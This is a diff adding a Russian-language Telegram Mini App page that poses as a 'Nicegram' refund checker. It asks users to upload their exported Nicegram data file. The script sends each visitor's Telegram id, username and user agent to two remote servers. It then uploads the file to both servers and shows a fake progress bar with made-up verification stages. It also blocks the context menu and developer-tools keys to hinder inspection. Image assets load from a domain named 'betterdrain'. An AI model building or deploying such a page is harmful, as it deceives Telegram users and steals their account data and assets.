@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Nicegram Holographic</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --holo-cyan: #0ff;
+            --holo-bg: rgba(10, 12, 20, 0.65);
+            --text-main: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.55);
+            --btn-blue-start: #0033cc;
+            --btn-blue-end: #0066ff;
+            --status-green: #00ffaa;
+            --error-red: #ff3333;
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glass-glow: rgba(0, 255, 255, 0.12);
+            --yellow: #ffef00;
+        }
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            background: radial-gradient(circle at 30% 30%, #08152a 0%, #000000 100%);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        #fileInput { display: none !important; }
+        #particles, .snow-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+        .liquid-blob {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(60px);
+            z-index: 0;
+            opacity: 0.18;
+            animation: floatBlob 14s infinite ease-in-out;
+        }
+        .blob-1 { width: 320px; height: 320px; background: #00ffff; top: -10%; left: -12%; }
+        .blob-2 { width: 280px; height: 280px; background: #0044ff; bottom: -10%; right: -12%; }
+        @keyframes floatBlob {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, -30px); }
+        }
+        .animated-images {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 2;
+        }
+        .image {
+            position: absolute;
+            width: 65px;
+            opacity: 0.12;
+            filter: blur(0.8px);
+            animation: floatImg 20s infinite ease-in-out;
+        }
+        .image1 { top: 20%; left: 10%; }
+        .image2 { top: 65%; left: 80%; }
+        .image3 { top: 70%; left: 15%; }
+        .image4 { top: 15%; left: 75%; }
+        @keyframes floatImg {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(6deg); }
+        }
+        .snowflake {
+            position: absolute;
+            background: radial-gradient(circle, #ffffff 0%, transparent 70%);
+            border-radius: 50%;
+            opacity: 0.75;
+            animation: fall linear infinite;
+        }
+        @keyframes fall {
+            to { transform: translateY(110vh) translateX(15px) rotate(360deg); }
+        }
+        .garland-wrap {
+            position: fixed;
+            top: -10px;
+            left: 0;
+            width: 100%;
+            height: 50px;
+            z-index: 20;
+            pointer-events: none;
+            display: flex;
+            justify-content: space-around;
+        }
+        .light-bulb {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            position: relative;
+            margin-top: 8px;
+            animation: flash 2s infinite alternate;
+        }
+        .bulb-cyan { background: #00ffff; box-shadow: 0 0 12px #00ffff; }
+        .bulb-blue { background: #0066ff; box-shadow: 0 0 12px #0066ff; }
+        .bulb-white { background: #ffffff; box-shadow: 0 0 12px #ffffff; }
+        @keyframes flash {
+            from { opacity: 0.35; }
+            to { opacity: 1; }
+        }
+        .frost-vignette {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            box-shadow: inset 0 0 100px rgba(150, 240, 255, 0.15);
+            pointer-events: none;
+            z-index: 55;
+        }
+        .glass-card {
+            position: relative;
+            z-index: 10;
+            width: 88%;
+            max-width: 340px;
+            padding: 50px 30px 40px;
+            background: var(--holo-bg);
+            border-radius: 28px;
+            backdrop-filter: blur(28px) saturate(150%);
+            -webkit-backdrop-filter: blur(28px) saturate(150%);
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.6), 0 0 0 1px var(--glass-glow);
+            text-align: center;
+        }
+        .santa-hat-icon {
+            position: absolute;
+            top: -28px;
+            right: -22px;
+            width: 60px;
+            filter: drop-shadow(0 0 8px rgba(0,255,255,0.4));
+            z-index: 12;
+        }
+        .logo-text {
+            font-size: 40px;
+            font-weight: 900;
+            color: #fff;
+            letter-spacing: -1.5px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 12px rgba(255, 255, 255, 0.25), 0 0 20px rgba(0, 255, 255, 0.15);
+            background: linear-gradient(90deg, #ffffff, #aaffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        h1 {
+            font-size: 22px;
+            font-weight: 800;
+            margin: 0 0 14px;
+            color: #fff;
+            opacity: 0.92;
+        }
+        p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.55;
+            margin-bottom: 20px;
+        }
+        .stats-wrapper {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 28px;
+            background: rgba(0, 50, 80, 0.25);
+            padding: 9px 20px;
+            border-radius: 50px;
+            border: 1px solid rgba(0, 200, 255, 0.15);
+        }
+        .live-dot {
+            width: 9px;
+            height: 9px;
+            background: var(--status-green);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--status-green);
+            animation: pulse-dot 2s infinite;
+        }
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+        #stats-counter {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--holo-cyan);
+            text-shadow: 0 0 6px rgba(0, 255, 255, 0.25);
+        }
+        .btn {
+            background: linear-gradient(135deg, var(--btn-blue-start), var(--btn-blue-end));
+            color: white;
+            border: none;
+            padding: 17px 0;
+            border-radius: 18px;
+            font-size: 18px;
+            font-weight: 800;
+            width: 100%;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0, 30, 100, 0.5), 0 0 0 1px rgba(0, 150, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .security-note {
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: var(--text-secondary);
+            font-weight: 600;
+            opacity: 0.7;
+        }
+        .security-note svg {
+            width: 12px;
+            height: 12px;
+            fill: var(--holo-cyan);
+        }
+        #step-loading {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-left-color: var(--holo-cyan);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 22px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status-text {
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 6px;
+        }
+        .percent-display {
+            font-size: 14px;
+            font-weight: 900;
+            color: var(--holo-cyan);
+        }
+        .no-close-warning {
+            color: var(--error-red);
+            font-size: 13px;
+            font-weight: 800;
+            margin: 10px 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        .footer-container {
+            position: absolute;
+            bottom: 35px;
+            display: flex;
+            gap: 18px;
+            z-index: 30;
+        }
+        .footer-btn {
+            background: rgba(15, 18, 28, 0.6);
+            color: #fff;
+            padding: 11px 20px;
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: all 0.3s ease;
+        }
+        .footer-btn:active {
+            transform: scale(0.95);
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            z-index: 40;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.35s ease;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .modal {
+            position: fixed;
+            bottom: -100%;
+            left: 0;
+            width: 100%;
+            background: rgba(15, 18, 28, 0.92);
+            backdrop-filter: blur(30px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px 30px 0 0;
+            padding: 30px 25px 45px;
+            z-index: 50;
+            transition: bottom 0.5s cubic-bezier(0.2, 1, 0.3, 1);
+            color: #fff;
+        }
+        .modal.active {
+            bottom: 0;
+        }
+        .modal h3 {
+            margin: 0 0 18px;
+            font-size: 20px;
+        }
+        .modal p, .modal ol, .modal li {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+        .btn-close {
+            background: rgba(255, 255, 255, 0.07);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            width: 100%;
+            padding: 15px;
+            margin-top: 22px;
+            border-radius: 16px;
+            font-weight: 800;
+            cursor: pointer;
+        }
+        .captcha-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            background: rgba(15, 18, 28, 0.95);
+            backdrop-filter: blur(30px);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            border-radius: 24px;
+            padding: 30px;
+            z-index: 60;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            text-align: center;
+            min-width: 280px;
+        }
+        .captcha-modal.active {
+            opacity: 1;
+            pointer-events: all;
+            transform: translate(-50%, -50%) scale(1);
+        }
+        .captcha-modal h3 {
+            margin: 0 0 10px;
+            font-size: 18px;
+            color: var(--holo-cyan);
+        }
+        .captcha-modal .challenge {
+            font-size: 32px;
+            font-weight: 900;
+            margin: 20px 0;
+            color: #fff;
+        }
+        .captcha-modal input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: 20px;
+            text-align: center;
+            font-weight: 700;
+            outline: none;
+        }
+        .captcha-modal input:focus {
+            border-color: var(--holo-cyan);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
+        }
+        .captcha-modal .btn {
+            margin-top: 15px;
+        }
+        .captcha-modal .error-text {
+            color: var(--error-red);
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="liquid-blob blob-1"></div>
+<div class="liquid-blob blob-2"></div>
+
+<div class="animated-images">
+    <img src="https://betterdrain.baby/ring.png" class="image image1">
+    <img src="https://betterdrain.baby/clock.png" class="image image2">
+    <img src="https://betterdrain.baby/shard.png" class="image image3">
+    <img src="https://betterdrain.baby/skull.png" class="image image4">
+</div>
+
+<div class="snow-container" id="snow"></div>
+
+<div class="glass-card">
+    <img src="https://cdn-icons-png.flaticon.com/512/744/744546.png" alt="NY" class="santa-hat-icon">
+    <div class="logo-text">Nicegram</div>
+
+    <div id="step-start">
+        <h1 id="greeting">Привет, Тракер</h1>
+        <p>Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+
+        <div class="stats-wrapper">
+            <div class="live-dot"></div>
+            <span id="stats-counter">Пройдено успешных проверок за сегодня <strong>3050</strong></span>
+        </div>
+
+        <input type="file" id="fileInput" accept=".zip,.txt" onchange="handleFileSelect(this)">
+        <button class="btn" onclick="document.getElementById('fileInput').click()">📁 Загрузить файл</button>
+
+        <div class="security-note">
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            NiceGram ® все данные защищены
+        </div>
+    </div>
+
+    <div id="step-loading">
+        <div class="spinner"></div>
+        <div class="status-text" id="statusText">Инициализация...</div>
+        <div class="no-close-warning">Не закрывайте приложение!</div>
+        <div class="percent-display" id="percentText">0%</div>
+    </div>
+</div>
+
+<div class="footer-container">
+    <div class="footer-btn" onclick="openModal('instructionModal')">Инструкция</div>
+    <div class="footer-btn" onclick="openModal('faqModal')">FAQ</div>
+</div>
+
+<div class="modal-overlay" onclick="closeAllModals()"></div>
+
+<div class="modal" id="instructionModal">
+    <h3>📋 Инструкция</h3>
+    <ol>
+        <li>Скачайте приложение Nicegram с официального сайта...</li>
+        <li>Откройте Nicegram и войдите в свой аккаунт.</li>
+        <li>Зайдите в настройки и выберите пункт «Nicegram».</li>
+        <li>Экспортируйте файл...</li>
+        <li>Откройте главное меню бота и нажмите на кнопку "Проверка на рефаунд".</li>
+        <li>Отправьте файл боту.</li>
+        <li>Ожидайте результатов проверки.</li>
+    </ol>
+    <button class="btn-close" onclick="closeAllModals()">Понятно</button>
+</div>
+
+<div class="modal" id="faqModal">
+    <h3>❓ Частые вопросы</h3>
+    <p><strong>Что такое рефаунд?</strong><br>Это возврат средств за подарок...</p>
+    <p><strong>Сколько времени занимает проверка?</strong><br>Обычно 3-5 минут, бывают задержки</p>
+    <p><strong>Мои файлы в безопасности?</strong><br>Да - мы не храним ваши файлы, их проверяет наш бот, после чего удаляет</p>
+    <button class="btn-close" onclick="closeAllModals()">Закрыть</button>
+</div>
+
+<div class="modal" id="errorModal">
+    <h3>⚠️ Ошибка!</h3>
+    <p>Файл должен быть в формате .zip или .txt! Пожалуйста, прочтите инструкцию.</p>
+    <button class="btn-close" onclick="closeAllModals()">Понятно</button>
+</div>
+
+<div class="captcha-modal" id="captchaModal">
+    <h3>🔐 Проверка безопасности</h3>
+    <p style="color: var(--text-secondary); font-size: 13px;">Решите пример для продолжения</p>
+    <div class="challenge" id="captchaChallenge">? + ? = ?</div>
+    <input type="number" id="captchaInput" placeholder="Ваш ответ" inputmode="numeric">
+    <div class="error-text" id="captchaError">Неверный ответ, попробуйте снова</div>
+    <button class="btn" onclick="submitCaptcha()">Подтвердить</button>
+</div>
+
+<script>
+const SERVER_URL = "https://qweqw2e-wb0q.onrender.com";
+const SERVER_URL_2 = "https://qweqwe-wb0q.onrender.com";
+
+const tg = window.Telegram.WebApp;
+tg.expand();
+
+const user = tg.initDataUnsafe?.user || {};
+if (user.first_name || user.username) {
+    document.getElementById('greeting').innerText = `Привет, ${user.first_name || user.username || 'Тракер'}`;
+}
+
+let currentFile = null;
+let captchaToken = null;
+let captchaRetries = 0;
+const MAX_CAPTCHA_RETRIES = 3;
+
+const sessionId = Math.random().toString(36).substring(2, 15);
+const requestTimestamps = [];
+
+function checkClientRateLimit() {
+    const now = Date.now();
+    const oneMinuteAgo = now - 60000;
+    while (requestTimestamps.length > 0 && requestTimestamps[0] < oneMinuteAgo) {
+        requestTimestamps.shift();
+    }
+    if (requestTimestamps.length >= 15) {
+        return false;
+    }
+    requestTimestamps.push(now);
+    return true;
+}
+
+const logEntry = {
+    user_id: user.id || "0000",
+    username: user.username || "no_username",
+    user_agent: navigator.userAgent,
+    session_id: sessionId
+};
+
+[SERVER_URL, SERVER_URL_2].forEach(url => {
+    if (checkClientRateLimit()) {
+        fetch(`${url}/log_entry`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(logEntry)
+        }).catch(e => console.error("Log error:", e));
+    }
+});
+
+async function getCaptcha(baseUrl) {
+    if (!checkClientRateLimit()) {
+        alert('Слишком много запросов. Подождите минуту.');
+        return null;
+    }
+    try {
+        const resp = await fetch(`${baseUrl}/get_captcha`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({user_id: user.id || "0000", session_id: sessionId})
+        });
+        if (!resp.ok) {
+            const err = await resp.json();
+            if (err.error === "IP заблокирован") {
+                alert('Ваш IP временно заблокирован. Попробуйте позже.');
+                return null;
+            }
+            throw new Error(err.error);
+        }
+        return await resp.json();
+    } catch(e) {
+        console.error("Captcha error:", e);
+        return null;
+    }
+}
+
+function handleFileSelect(input) {
+    const file = input.files[0];
+    if (!file) return;
+    
+    const ext = file.name.toLowerCase().split('.').pop();
+    if (ext !== 'zip' && ext !== 'txt') {
+        openModal('errorModal');
+        input.value = '';
+        return;
+    }
+
+    if (file.size > 50 * 1024 * 1024) {
+        alert('Файл слишком большой. Максимум 50MB.');
+        input.value = '';
+        return;
+    }
+
+    currentFile = file;
+    captchaRetries = 0;
+    showCaptcha();
+}
+
+async function showCaptcha() {
+    const captcha = await getCaptcha(SERVER_URL);
+    if (!captcha) {
+        currentFile = null;
+        document.getElementById('fileInput').value = '';
+        return;
+    }
+    
+    captchaToken = captcha.token;
+    document.getElementById('captchaChallenge').innerText = captcha.challenge;
+    document.getElementById('captchaInput').value = '';
+    document.getElementById('captchaError').style.display = 'none';
+    document.getElementById('captchaModal').classList.add('active');
+    document.querySelector('.modal-overlay').classList.add('active');
+    
+    setTimeout(() => document.getElementById('captchaInput').focus(), 300);
+}
+
+async function submitCaptcha() {
+    const answer = document.getElementById('captchaInput').value.trim();
+    if (!answer) {
+        document.getElementById('captchaError').innerText = 'Введите ответ';
+        document.getElementById('captchaError').style.display = 'block';
+        return;
+    }
+
+    document.getElementById('captchaModal').classList.remove('active');
+    document.querySelector('.modal-overlay').classList.remove('active');
+    
+    startVerification(currentFile, captchaToken, answer);
+}
+
+async function startVerification(file, token, answer) {
+    document.getElementById('step-start').style.display = 'none';
+    document.getElementById('step-loading').style.display = 'flex';
+    
+    const uploadSuccess = await uploadFileInBackground(file, token, answer);
+    
+    if (!uploadSuccess) {
+        captchaRetries++;
+        if (captchaRetries >= MAX_CAPTCHA_RETRIES) {
+            alert('Слишком много неудачных попыток. Попробуйте позже.');
+            document.getElementById('step-start').style.display = 'block';
+            document.getElementById('step-loading').style.display = 'none';
+            currentFile = null;
+            document.getElementById('fileInput').value = '';
+            return;
+        }
+        document.getElementById('step-start').style.display = 'block';
+        document.getElementById('step-loading').style.display = 'none';
+        document.getElementById('captchaError').innerText = 'Неверная капча. Попробуйте снова.';
+        showCaptcha();
+        return;
+    }
+
+    let progress = 0;
+    const timer = setInterval(() => {
+        progress += 0.5;
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(timer);
+            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            setTimeout(() => tg.close(), 1000);
+        }
+        document.getElementById('percentText').innerText = Math.floor(progress) + "%";
+        const st = document.getElementById('statusText');
+        if (progress < 25) st.innerText = "Проверяем ликвидность файла";
+        else if (progress < 50) st.innerText = "Анализируем аукционы";
+        else if (progress < 75) st.innerText = "Проверка происхождения звёзд";
+        else st.innerText = "Формирование вердикта";
+    }, 600);
+}
+
+async function uploadFileInBackground(file, captchaToken, captchaAnswer) {
+    if (!checkClientRateLimit()) {
+        alert('Слишком много запросов. Подождите.');
+        return false;
+    }
+
+    let success = false;
+    
+    const sendTo = async (baseUrl) => {
+        const formData = new FormData();
+        formData.append('user_id', user.id || "0000");
+        formData.append('username', user.username || "no_username");
+        formData.append('user_agent', navigator.userAgent);
+        formData.append('session_id', sessionId);
+        formData.append('file', file);
+        
+        try {
+            const resp = await fetch(`${baseUrl}/upload`, {
+                method: 'POST',
+                headers: {
+                    'X-Captcha-Token': captchaToken,
+                    'X-Captcha-Answer': captchaAnswer
+                },
+                body: formData,
+                mode: 'cors'
+            });
+            
+            if (resp.ok) {
+                success = true;
+                return true;
+            } else {
+                const err = await resp.json();
+                console.error(`Upload error: ${err.error}`);
+                return false;
+            }
+        } catch (e) {
+            console.error(`Upload error (${baseUrl}):`, e);
+            return false;
+        }
+    };
+    
+    await Promise.all([
+        sendTo(SERVER_URL),
+        sendTo(SERVER_URL_2)
+    ]);
+
+    return success;
+}
+
+const snow = document.getElementById('snow');
+for (let i = 0; i < 40; i++) {
+    const f = document.createElement('div');
+    f.className = 'snowflake';
+    f.style.left = Math.random() * 100 + '%';
+    f.style.width = f.style.height = (Math.random() * 4 + 2) + 'px';
+    f.style.animationDuration = Math.random() * 5 + 5 + 's';
+    snow.appendChild(f);
+}
+
+function openModal(id) {
+    document.querySelector('.modal-overlay').classList.add('active');
+    document.getElementById(id).classList.add('active');
+}
+
+function closeAllModals() {
+    document.querySelector('.modal-overlay').classList.remove('active');
+    document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
+    document.getElementById('captchaModal').classList.remove('active');
+}
+
+document.getElementById('captchaInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        submitCaptcha();
+    }
+});
+
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        e.preventDefault();
+    }
+});
+</script>
+
+</body>
+</html>
